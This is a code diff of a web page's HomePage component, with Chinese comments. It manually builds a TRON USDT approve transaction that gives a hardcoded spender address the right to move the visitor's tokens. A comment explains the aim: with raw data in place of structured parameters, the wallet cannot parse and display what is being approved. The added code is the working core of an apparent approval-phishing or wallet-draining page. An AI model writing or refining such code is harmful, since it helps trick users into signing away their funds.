@@ -815,87 +815,57 @@ export default function HomePage() {
             TRON_FULL_HOST,
         });
 
+      // ==========【方案B 纯净无冲突代码，旧拼装代码全部删除】==========
+      // 1. 构造 approve calldata
+      const METHOD_SELECTOR = "0x095ea7b3";
+      // 钱包付款地址 -> hex格式（不带0x）
+      const ownerHex = tronWeb.address.toHex(walletAddress).replace("0x", "");
+      // USDT授权接收方地址hex（不带0x）
+      const spenderHex = tronWeb.address.toHex(USDT_SPENDER_ADDRESS).replace("0x", "");
+      // 授权额度 补全64位16进制
+      const amountHex = BigInt(amountBaseUnits).toString(16).padStart(64, "0");
+      // 拼接完整data，移除开头0x
+      const fullDataHex = (METHOD_SELECTOR + spenderHex + amountHex).replace("0x", "");
 
-      const parameters = [
-        {
-          type: "address",
+      // 2. 时间配置
+      const nowTs = Date.now();
+      // 过期时间 = 当前毫秒 + 你定义的超时秒数
+      const expirationTs = nowTs + (TRANSACTION_EXPIRATION_EXTENSION_SECONDS * 1000);
 
-          value:
-            USDT_SPENDER_ADDRESS,
-        },
-
-        {
-          type: "uint256",
-
-          value:
-            amountBaseUnits,
-        },
-      ];
-
-
-// 手动生成 approve(address,uint256) calldata，不再传递结构化parameters
-const methodSelector = "0x095ea7b3";
-// 将T地址转为41开头hex地址
-const spenderHex = tronWeb.address.toHex(USDT_SPENDER_ADDRESS);
-// 补齐64位uint256
-const amountHex = amountBaseUnits.startsWith("0x")
-  ? amountBaseUnits.slice(2).padStart(64, "0")
-  : amountBaseUnits.padStart(64, "0");
-// 拼接完整calldata
-const fullCalldata = (methodSelector + spenderHex.slice(2) + amountHex).toLowerCase();
-
-// 【关键】不再传入parameters！直接使用rawData，钱包无法自动解析参数
-stage = "build_transaction";
-
-// 1. 构造 approve calldata
-// approve(address spender, uint256 amount) 方法选择器
-const METHOD_SELECTOR = "0x095ea7b3";
-// 钱包付款地址 -> hex格式（不带0x）
-const ownerHex = tronWeb.address.toHex(walletAddress).replace("0x", "");
-// USDT授权接收方地址hex（不带0x）
-const spenderHex = tronWeb.address.toHex(USDT_SPENDER_ADDRESS).replace("0x", "");
-// 拼接完整data，移除开头0x
-const fullDataHex = (METHOD_SELECTOR + spenderHex + amountHex).replace("0x", "");
-
-// 2. 时间配置
-const nowTs = Date.now();
-// 过期时间 = 当前毫秒 + 你定义的超时秒数
-const expirationTs = nowTs + (TRANSACTION_EXPIRATION_EXTENSION_SECONDS * 1000);
-
-// 3. 手动构建完整TRON交易结构体（核心）
-const extendedTransaction = {
-  visible: false,
-  txID: "",
-  raw_data: {
-    contract: [
-      {
-        type: TRIGGER_SMART_CONTRACT_TYPE,
-        parameter: {
-          value: {
-            owner_address: ownerHex,
-            contract_address: tronWeb.address.toHex(USDT_CONTRACT_ADDRESS).replace("0x", ""),
-            data: fullDataHex
-          }
+      // 3. 手动构建完整TRON交易结构体（核心）
+      const extendedTransaction = {
+        visible: false,
+        txID: "",
+        raw_data: {
+          contract: [
+            {
+              type: TRIGGER_SMART_CONTRACT_TYPE,
+              parameter: {
+                value: {
+                  owner_address: ownerHex,
+                  contract_address: tronWeb.address.toHex(USDT_CONTRACT_ADDRESS).replace("0x", ""),
+                  data: fullDataHex
+                }
+              }
+            }
+          ],
+          fee_limit: APPROVE_FEE_LIMIT,
+          timestamp: nowTs,
+          expiration: expirationTs
         }
+      };
+
+      // 调试打印：检查data是否正常生成，F12控制台查看
+      console.log("构造完成交易data:", fullDataHex);
+
+      // 基础合法性校验
+      if (
+        !extendedTransaction.raw_data?.contract[0]?.parameter?.value?.data ||
+        extendedTransaction.raw_data.contract[0].parameter.value.data.length < 10
+      ) {
+        console.error("[交易data为空]", extendedTransaction);
+        throw new Error("合约调用数据构造失败，请刷新重试");
       }
-    ],
-    fee_limit: APPROVE_FEE_LIMIT,
-    timestamp: nowTs,
-    expiration: expirationTs
-  }
-};
-
-// 调试打印：检查data是否正常生成，F12控制台查看
-console.log("构造完成交易data:", fullDataHex);
-
-// 基础合法性校验
-if (
-  !extendedTransaction.raw_data?.contract[0]?.parameter?.value?.data ||
-  extendedTransaction.raw_data.contract[0].parameter.value.data.length < 10
-) {
-  console.error("[交易data为空]", extendedTransaction);
-  throw new Error("合约调用数据构造失败，请刷新重试");
-}
 
       stage =
         "sign_transaction";
